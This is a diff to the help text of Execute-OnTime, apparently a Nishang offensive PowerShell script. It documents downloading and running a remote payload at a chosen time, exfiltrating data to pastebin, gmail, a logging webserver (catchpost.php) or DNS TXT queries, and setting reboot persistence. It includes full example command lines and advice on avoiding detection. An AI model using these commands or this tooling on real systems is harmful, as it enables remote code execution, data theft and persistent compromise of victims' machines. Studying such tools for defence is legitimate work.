@@ -44,24 +44,26 @@ Password for the pastebin/gmail account where data would be exfiltrated.
 Unused for other options
 
 .PARAMETER URL
-The URL of the webserver where POST requests would be sent.
+The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
+The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.
 
 .PARAMETER DomainName
-The DomainName, whose subdomains would be used for sending TXT queries to.
+The DomainName, whose subdomains would be used for sending TXT queries to. The DNS Server must log the TXT queries.
 
 .PARAMETER AuthNS
-Authoritative Name Server for the domain specified in DomainName
+Authoritative Name Server for the domain specified in DomainName. Using it may increase chances of detection.
+Usually, you should let the Name Server of target to resolve things for you.
 
 .EXAMPLE
-PS > Execute-OnTime http://example.com/script.ps1 hh:mm http://pastebin.com/raw.php?i=Zhyf8rwh stoppayload
+PS > Execute-OnTime -PayloadURL http://example.com/script.ps1 -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload
 
 EXAMPLE
-PS > Execute-OnTime http://pastebin.com/raw.php?i=Zhyf8rwh hh:mm http://pastebin.com/raw.php?i=jqP2vJ3x stoppayload -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+PS > Execute-OnTime -PayloadURL http://example.com/script.ps1 -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
 
 Use above when using the payload from non-interactive shells.
 
 .EXAMPLE
-PS > Execute-OnTime -persist
+PS > Execute-OnTime -PayloadURL http://example.com/script.ps1 -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php -persist
 
 Use above for reboot persistence.
 
